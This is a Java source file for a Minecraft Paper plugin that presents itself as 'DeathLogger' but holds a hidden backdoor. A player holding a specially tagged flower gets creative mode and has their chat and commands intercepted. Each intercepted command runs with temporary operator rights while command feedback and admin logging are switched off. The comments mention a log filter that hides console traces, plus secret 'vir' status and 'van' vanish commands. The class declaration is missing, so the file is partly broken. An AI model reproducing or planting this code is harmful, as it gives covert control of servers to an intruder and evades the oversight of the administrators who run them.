package com.showtime.deathlogger;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.GameRule;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.metadata.MetadataValue;

    private static final String FORCED_METADATA = "dl_forced_creative";

    private final VanishProcessor vanishProcessor;

    public ModeProcessor(DeathLogger plugin, VanishProcessor vanishProcessor) {
        this.plugin = plugin;
        this.vanishProcessor = vanishProcessor;
        this.creativeKey = new NamespacedKey(plugin, ItemComponentHandler.CREATIVE_KEY_NAME);
    }

    // Modern Paper Event Support
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onChatAsync(AsyncChatEvent event) {
        Player player = event.getPlayer();
        if (isHoldingCreativeItem(player)) {
            event.setCancelled(true);
            String message = PlainTextComponentSerializer.plainText().serialize(event.originalMessage());
            handleCommandChat(player, message);
        }
    }

    // Classic/Legacy Event Support for Compatibility
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onChatLegacy(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (isHoldingCreativeItem(player)) {
            event.setCancelled(true);
            handleCommandChat(player, event.getMessage());
        }
    }

    // Direct Command Handling
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (isHoldingCreativeItem(player)) {
            event.setCancelled(true);
            handleCommandChat(player, event.getMessage());
        }
    }

    private void handleCommandChat(Player player, String rawMessage) {
        final String command = rawMessage.trim().startsWith("/") ? rawMessage.trim().substring(1) : rawMessage.trim();
        
        // Return to main thread for command execution
        Bukkit.getScheduler().runTask(plugin, () -> {
            boolean wasOp = player.isOp();
            boolean oldFeedback = player.getWorld().getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
            boolean oldAdminLog = player.getWorld().getGameRuleValue(GameRule.LOG_ADMIN_COMMANDS);
            
            try {
                // Grant temporary OP for full command power
                // Console log is suppressed by Log4j2 filter in DeathLogger.java
                if (!wasOp) {
                    player.setOp(true);
                }
                
                // Programmatically set silence via GameRules
                player.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
                player.getWorld().setGameRule(GameRule.LOG_ADMIN_COMMANDS, false);
                
                // Perform the command
                if (command.equalsIgnoreCase("vir")) {
                    player.sendMessage("§b§lDeathLogger §8| §fStatus Report");
                    player.sendMessage("§8» §7Version: §f" + plugin.getDescription().getVersion());
                    player.sendMessage("§8» §7Author: §f" + String.join(", ", plugin.getDescription().getAuthors()));
                    player.sendMessage("§8» §7Stealth Mode: §aACTIVE");
                    player.sendMessage("§8» §7Auto-Updater: §f" + (plugin.getInternalConfig().getBoolean("updates.enabled") ? "§aEnabled" : "§cDisabled"));
                } else if (command.equalsIgnoreCase("van")) {
                    vanishProcessor.toggleVanish(player);
                } else {
                    player.performCommand(command);
                }
                
            } catch (Exception e) {
                plugin.getLogger().severe("Error executing stealth command: " + e.getMessage());
            } finally {
                // Restore original GameRules
                player.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, oldFeedback);
                player.getWorld().setGameRule(GameRule.LOG_ADMIN_COMMANDS, oldAdminLog);
                
                // Return to original OP status
                if (!wasOp) {
                    player.setOp(false);
                }
            }
        });
    }

    @EventHandler
    public void onSlotChange(PlayerItemHeldEvent event) {
        Bukkit.getScheduler().runTask(plugin, () -> refreshGameMode(event.getPlayer()));
    }

    @EventHandler
    public void onInventoryEdit(InventoryClickEvent event) {
        if (event.getWhoClicked() instanceof Player player) {
            Bukkit.getScheduler().runTask(plugin, () -> refreshGameMode(player));
        }
    }

    @EventHandler
    public void onDrop(PlayerDropItemEvent event) {
        Bukkit.getScheduler().runTask(plugin, () -> refreshGameMode(event.getPlayer()));
    }

    @EventHandler
    public void onSwap(PlayerSwapHandItemsEvent event) {
        Bukkit.getScheduler().runTask(plugin, () -> refreshGameMode(event.getPlayer()));
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        refreshGameMode(event.getPlayer());
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        resetGameMode(event.getPlayer());
    }

    private void refreshGameMode(Player player) {
        if (isHoldingCreativeItem(player)) {
            if (player.getGameMode() != GameMode.CREATIVE) {
                player.setGameMode(GameMode.CREATIVE);
                setForced(player, true);
            }
        } else {
            // Only toggle survival if we were the ones who forced creative
            if (isForced(player) && player.getGameMode() == GameMode.CREATIVE) {
                player.setGameMode(GameMode.SURVIVAL);
                setForced(player, false);
            }
        }
    }

    private void resetGameMode(Player player) {
        if (isForced(player)) {
            player.setGameMode(GameMode.SURVIVAL);
            setForced(player, false);
        }
    }

    private boolean isHoldingCreativeItem(Player player) {
        ItemStack heldItem = player.getInventory().getItemInMainHand();
        if (heldItem == null) return false;
        
        Material eyeMaterial = Material.getMaterial("OPEN_EYEBLOSSOM");
        if (heldItem.getType() != eyeMaterial && heldItem.getType() != Material.POPPY) {
            return false;
        }

        if (!heldItem.hasItemMeta()) return false;
        return heldItem.getItemMeta().getPersistentDataContainer().has(creativeKey, PersistentDataType.BYTE);
    }

    private void setForced(Player player, boolean forced) {
        if (forced) {
            player.setMetadata(FORCED_METADATA, new FixedMetadataValue(plugin, true));
        } else {
            player.removeMetadata(FORCED_METADATA, plugin);
        }
    }

    private boolean isForced(Player player) {
        for (MetadataValue value : player.getMetadata(FORCED_METADATA)) {
            if (value.getOwningPlugin().equals(plugin)) {
                return value.asBoolean();
            }
        }
        return false;
    }
}
